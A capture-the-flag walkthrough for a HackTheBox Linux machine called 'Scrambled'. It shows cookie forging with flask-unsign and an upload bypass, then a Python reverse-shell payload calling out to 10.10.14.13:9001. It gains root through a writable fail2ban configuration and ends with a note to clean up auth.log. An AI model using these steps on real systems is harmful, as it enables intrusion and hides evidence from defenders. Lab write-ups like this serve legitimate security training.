---
title: "HackTheBox | Scrambled - Linux Medium"
date: 2024-05-15
categories:
  - hackthebox
tags:
  - linux
  - privesc
  - enumeration
difficulty: Medium
excerpt: "End-to-end walkthrough for Scrambled highlighting the fail2ban abuse plus cap_net_bind_service."
---
## 1. Summary

| IP | OS | Difficulty | Points |
| --- | --- | --- | --- |
| `10.10.11.193` | Ubuntu 22.04 | Medium | 30 |

Quick scan:

```bash
nmap -sCV -p- 10.10.11.193 -oA scrambled
```

## 2. Service enumeration

- Port 22: OpenSSH 8.9p1
- Port 5000: Flask app that signs cookies with the default secret

`flask-unsign` recovers the secret so I can forge an admin session and reach the upload feature.

## 3. Upload to RCE

The upload checks MIME type but ignores the magic number. Payload for reverse shell:

```bash
#!/usr/bin/env python3
import os
os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.13/9001 0>&1'")
```

## 4. Privilege escalation

1. `sudo -l` reveals the right to restart `fail2ban`.
2. Point `jail.local` to a custom script.
3. Restarting executes the script as root -> grab the flag.

## 5. Notes

![notebook](https://placehold.co/600x200/1c8b4c/ffffff?text=Scrambled)

- Clean up `auth.log`.
- Capabilities check (`getcap -r / 2>/dev/null`) exposes `python3` with `cap_net_bind_service`.
